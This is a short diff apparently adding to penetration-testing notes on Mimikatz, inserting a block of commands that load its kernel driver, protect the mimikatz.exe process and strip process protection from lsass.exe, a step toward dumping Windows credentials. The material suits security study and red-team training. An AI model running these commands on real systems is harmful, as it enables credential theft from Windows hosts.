@@ -23,4 +23,10 @@
   - The goal is to remove process protection from a process (typicall `lsass.exe`)
   - It will patch the process and remove process protections
   - You can also protect processes too with this, for instance, protect `mimikatz.exe` and then unprotect `lsass.exe`
+  ```
+  mmk# privilege::debug
+  mmk# !+
+  mmk# !processprotect /process:mimikatz.exe
+  mmk# !processprotect /process:lsass.exe /remove
+  ```
 
